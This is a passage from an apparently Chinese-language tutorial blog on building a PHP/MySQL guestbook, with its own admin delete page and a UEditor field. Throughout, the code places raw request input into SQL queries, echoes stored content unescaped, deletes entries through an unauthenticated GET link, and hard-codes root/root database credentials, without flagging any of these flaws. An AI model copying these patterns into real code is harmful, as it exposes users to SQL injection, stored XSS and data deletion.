查询并显示留言列表</span></span><br><span class="line">            <span class="variable">$sql1</span> = <span class="string">&quot;SELECT * FROM gbook&quot;</span>;</span><br><span class="line">            <span class="variable">$data</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>, <span class="variable">$sql1</span>);</span><br><span class="line">            <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_row</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;用户名：&#x27;</span> . <span class="variable">$row</span>[<span class="number">0</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;内容：&#x27;</span> . <span class="variable">$row</span>[<span class="number">1</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;IP地址：&#x27;</span> . <span class="variable">$row</span>[<span class="number">2</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;UA浏览器：&#x27;</span> . <span class="variable">$row</span>[<span class="number">3</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;留言失败！&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 用户名为空的情况</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;用户名不能为空！&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>解释</p>
<blockquote>
<p>$dbip &#x3D; ‘localhost’;<br>$dbuser &#x3D; ‘root’;<br>$dbpass &#x3D; ‘root’;<br>$dbname &#x3D; ‘test’;</p>
<p>数据库连接所需要的参数：主机名、用户名、用户密码、所使用的数据库</p>
</blockquote>
<blockquote>
<p>$con &#x3D; mysqli_connect($dbip, $dbuser, $dbpass, $dbname);</p>
<table>
<thead>
<tr>
<th><em>host</em></th>
<th>可选。规定主机名或 IP 地址。</th>
</tr>
</thead>
<tbody><tr>
<td><em>username</em></td>
<td>可选。规定 MySQL 用户名。</td>
</tr>
<tr>
<td><em>password</em></td>
<td>可选。规定 MySQL 密码。</td>
</tr>
<tr>
<td><em>dbname</em></td>
<td>可选。规定默认使用的数据库。</td>
</tr>
<tr>
<td><em>port</em></td>
<td>可选。规定尝试连接到 MySQL 服务器的端口号。</td>
</tr>
</tbody></table>
</blockquote>
<blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="variable">$con</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;连接错误：&quot;</span> . <span class="title function_ invoke__">mysqli_connect_errno</span>());</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 获取用户名</span></span><br><span class="line">    <span class="variable">$u</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查用户名是否非空</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$u</span>)) &#123;</span><br><span class="line">        <span class="comment">// 获取内容、IP地址和用户代理信息</span></span><br><span class="line">        <span class="variable">$c</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">        <span class="variable">$i</span> = @<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]; <span class="comment">/*获取客户端 IP 地址*/</span></span><br><span class="line">        <span class="variable">$ua</span> = @<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];<span class="comment">/*获取客户端用户代理信息*/</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 数据库查询语句，将数据插入到名为 gbook 的表中</span></span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO gbook(`username`, `content`, `ipaddr`, `uagent`) VALUES (&#x27;<span class="subst">$u</span>&#x27;, &#x27;<span class="subst">$c</span>&#x27;, &#x27;<span class="subst">$i</span>&#x27;, &#x27;<span class="subst">$ua</span>&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 执行数据库查询</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;留言成功！&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 查询并显示留言列表</span></span><br><span class="line">            <span class="variable">$sql1</span> = <span class="string">&quot;SELECT * FROM gbook&quot;</span>;</span><br><span class="line">            <span class="variable">$data</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>, <span class="variable">$sql1</span>);</span><br><span class="line">            <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_row</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;用户名：&#x27;</span> . <span class="variable">$row</span>[<span class="number">0</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;内容：&#x27;</span> . <span class="variable">$row</span>[<span class="number">1</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;IP地址：&#x27;</span> . <span class="variable">$row</span>[<span class="number">2</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;UA浏览器：&#x27;</span> . <span class="variable">$row</span>[<span class="number">3</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;留言失败！&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 用户名为空的情况</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;用户名不能为空！&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>mysqli_connect_errno()：显示数据库连接时的报错信息</p>
<p> $u &#x3D; @$_POST[‘username’] ：获取POST请求方法中的username值</p>
<p>$c &#x3D; @$_POST[‘content’]：获取POST请求方法中的content值</p>
<p>$i &#x3D; @$_SERVER[‘HTTP_USER_AGENT’]：获取客户端用户代理信息</p>
<p>注意：使用 <strong><code>@</code></strong> 符号可以抑制错误报告。在给变量赋值的同时使用 <strong><code>@</code></strong> 符号时，如果发生错误（比如未定义的变量），<strong>PHP 将不会生成错误消息，而是返回 <code>NULL</code> 或者一个空值。</strong></p>
<p>mysqli_query($con, $sql1)： 执行数据库查询</p>
</blockquote>
<h4 id="全局变量和函数调用"><a href="#全局变量和函数调用" class="headerlink" title="全局变量和函数调用"></a>全局变量和函数调用</h4><p>问题发现：当我们在不同php文件执行sql语句时，sql相关配置信息需要反复重写</p>
<p>方法解决：将经常用到的数据库链接操作生成config.php文件，方便管理</p>
<p>1、创建config.php文件</p>
<p><img src="/img/xiaodi/image-20250514184739321.png" alt="image-20250514184739321"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $dbip = &#x27;localhost&#x27;;</span><br><span class="line">    $dbuser = &#x27;root&#x27;;</span><br><span class="line">    $dbpass = &#x27;root&#x27;;</span><br><span class="line">    $dbname = &#x27;test&#x27;;</span><br><span class="line">    $con = mysqli_connect($dbip, $dbuser, $dbpass, $dbname);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>







<p>2、修改gbook.php文件</p>
<p><img src="/img/xiaodi/image-20250514184818134.png" alt="image-20250514184818134"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include(&#x27;./config.php&#x27;);</span><br></pre></td></tr></table></figure>







<p>2、创建admin文件夹添加删除功能</p>
<p><img src="/img/xiaodi/image-20250514185159218.png" alt="image-20250514185159218"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 包含数据库配置文件</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;<span class="comment">//由于创建的文件夹admin，其距离config.php匹配使用../</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 查询所有留言</span></span><br><span class="line"><span class="variable">$sql1</span>=<span class="string">&quot;select * from gbook&quot;</span>;</span><br><span class="line"><span class="variable">$data</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql1</span>);</span><br><span class="line"><span class="comment">// 循环遍历每条留言并显示信息和删除链接</span></span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_row</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;用户名：&#x27;</span>.<span class="variable">$row</span>[<span class="number">0</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;内容：&#x27;</span>.<span class="variable">$row</span>[<span class="number">1</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;IP地址：&#x27;</span>.<span class="variable">$row</span>[<span class="number">2</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;UA浏览器：&#x27;</span>.<span class="variable">$row</span>[<span class="number">3</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    **<span class="comment">// 提供删除链接，传递留言用户名作为参数</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;gbook-admin.php?del=<span class="subst">$row</span>[0]&#x27;&gt;删除&lt;/a&gt;&quot;</span>;**</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取要删除的留言用户名</span></span><br><span class="line"><span class="variable">$delstr</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;del&#x27;</span>];</span><br><span class="line">**<span class="comment">// 构建删除留言的 SQL 查询语句</span></span><br><span class="line"><span class="variable">$sql2</span>=<span class="string">&quot;delete from gbook where username =&#x27;<span class="subst">$delstr</span>&#x27;;&quot;</span>;</span><br><span class="line"><span class="comment">// 执行删除操作</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql2</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;删除成功 ！&#x27;)&lt;/script&gt;&quot;</span>;**</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p>问题发现：当我们没有传入删除的用户名时，也会进行弹窗</p>
<p>原因分析：没有对del参数是否有值进行判断</p>
<p>解决方法；</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取要删除的留言用户名</span></span><br><span class="line"><span class="variable">$delstr</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;del&#x27;</span>];</span><br><span class="line"></span><br><span class="line">**<span class="comment">// 检查是否设置了要删除的留言用户名</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$delstr</span>)) &#123;**</span><br><span class="line">    <span class="comment">// 构建删除留言的 SQL 查询语句</span></span><br><span class="line">    <span class="variable">$sql2</span> = <span class="string">&quot;DELETE FROM gbook WHERE username =&#x27;<span class="subst">$delstr</span>&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行删除操作</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>, <span class="variable">$sql2</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;删除成功！&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>









<p>问题发现：是否每次创建php文件方法都需要再写一遍呢？</p>
<p>解决方法：使用方法进行包装</p>
<p>1、代码优化</p>
<p>gbook.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加留言</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add_gbook</span>(<span class="params"><span class="variable">$con</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$u</span>=@<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$u</span>)) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$c</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">        <span class="variable">$i</span> = @<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]; <span class="comment">/*获取客户端 IP 地址*/</span></span><br><span class="line">        <span class="variable">$ua</span> = @<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];<span class="comment">/*获取客户端用户代理信息*/</span></span><br><span class="line">        <span class="comment">// 数据库查询语句，将数据插入到名为 gbook 的表中</span></span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;insert into gbook(`username`, `content`,`ipaddr`,`uagent`) value(&#x27;<span class="subst">$u</span>&#x27;, &#x27;<span class="subst">$c</span>&#x27;,&#x27;<span class="subst">$i</span>&#x27;,&#x27;<span class="subst">$ua</span>&#x27;);&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;留言成功！&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//显示留言</span></span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">show_gbook</span>(<span class="params"><span class="variable">$con</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$sql1</span>=<span class="string">&quot;select * from gbook&quot;</span>;</span><br><span class="line">            <span class="variable">$data</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql1</span>);</span><br><span class="line">            <span class="keyword">while</span> (<span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_row</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;用户名：&#x27;</span> . <span class="variable">$row</span>[<span class="number">0</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;内容：&#x27;</span> . <span class="variable">$row</span>[<span class="number">1</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;IP地址：&#x27;</span> . <span class="variable">$row</span>[<span class="number">2</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;UA浏览器：&#x27;</span> . <span class="variable">$row</span>[<span class="number">3</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 调用添加留言的函数</span></span><br><span class="line"><span class="title function_ invoke__">add_gbook</span>(<span class="variable">$con</span>);</span><br><span class="line"><span class="comment">// 调用显示留言的函数</span></span><br><span class="line"><span class="title function_ invoke__">show_gbook</span>(<span class="variable">$con</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>gbook-admin.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 包含数据库配置文件</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="comment">// 包含处理留言的功能文件</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../gbook.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用显示留言的函数，传递 &#x27;del&#x27; 参数，以显示删除链接</span></span><br><span class="line"><span class="title function_ invoke__">show_gbook</span>(<span class="variable">$con</span>,<span class="string">&#x27;del&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取要删除的留言用户名</span></span><br><span class="line"><span class="variable">$delstr</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;del&#x27;</span>];</span><br><span class="line"><span class="comment">// 检查是否设置了要删除的留言用户名</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$delstr</span>))&#123;</span><br><span class="line">    <span class="comment">// 构建删除留言的 SQL 查询语句</span></span><br><span class="line">    <span class="variable">$sql2</span>=<span class="string">&quot;delete from gbook where username =&#x27;<span class="subst">$delstr</span>&#x27;;&quot;</span>;</span><br><span class="line"><span class="comment">// 执行删除操作</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql2</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;删除成功 ！&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查询所有留言</span></span><br><span class="line"><span class="comment">/*$sql1=&quot;select * from gbook&quot;;</span></span><br><span class="line"><span class="comment">$data=mysqli_query($con,$sql1);</span></span><br><span class="line"><span class="comment">// 循环遍历每条留言并显示信息和删除链接</span></span><br><span class="line"><span class="comment">while ($row=mysqli_fetch_row($data))&#123;</span></span><br><span class="line"><span class="comment">    echo &#x27;&lt;hr&gt;&#x27;;</span></span><br><span class="line"><span class="comment">    echo &#x27;用户名：&#x27;.$row[0].&#x27;&lt;br&gt;&#x27;;</span></span><br><span class="line"><span class="comment">    echo &#x27;内容：&#x27;.$row[1].&#x27;&lt;br&gt;&#x27;;</span></span><br><span class="line"><span class="comment">    echo &#x27;IP地址：&#x27;.$row[2].&#x27;&lt;br&gt;&#x27;;</span></span><br><span class="line"><span class="comment">    echo &#x27;UA浏览器：&#x27;.$row[3].&#x27;&lt;br&gt;&#x27;;</span></span><br><span class="line"><span class="comment">    // 提供删除链接，传递留言用户名作为参数</span></span><br><span class="line"><span class="comment">    echo &quot;&lt;a href=&#x27;gbook-admin.php?del=$row[0]&#x27;&gt;删除&lt;/a&gt;&quot;;</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>







<h4 id="添加第三方插件实现上传"><a href="#添加第三方插件实现上传" class="headerlink" title="添加第三方插件实现上传"></a>添加第三方插件实现上传</h4><p>引用ueditor并创建对应文件夹，导入成功后，然后改变html代码</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./ueditor/ueditor.config.js&quot;</span>&gt;</span><span class="language-javascript"><span class="comment">/*引入配置文件*/</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./ueditor/ueditor.all.js&quot;</span>&gt;</span><span class="language-javascript"><span class="comment">/*引入源码文件*/</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>**</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;form1&quot;</span> <span class="attr">name</span>=<span class="string">&quot;form1&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span></span></span><br><span class="line"><span class="tag">      &lt;<span class="attr">p</span>&gt;</span></span><br><span class="line">          用户名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">            内容：</span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">           **<span class="tag">&lt;<span class="name">textarea</span> <span class="attr">id</span>=<span class="string">&quot;content&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;10&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;70&quot;</span> <span class="attr">name</span>=<span class="string">&quot;content&quot;</span> <span class="attr">style</span>=<span class="string">&quot;border:1px solid #E5E5E5;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">               <span class="variable constant_">UE</span>.<span class="title function_">getEditor</span>(<span class="string">&quot;content&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">               <span class="comment">//实例化编辑器传参,id为将要被替换的容器。</span></span></span><br><span class="line"><span class="language-javascript">           </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">id</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="/img/xiaodi/image-20250514192147586.png" alt="image-20250514192147586"></p>
<p><img src="/img/xiaodi/image-20250514192206166.png" alt="image-20250514192206166"></p>
<h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p>gbook.php</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span 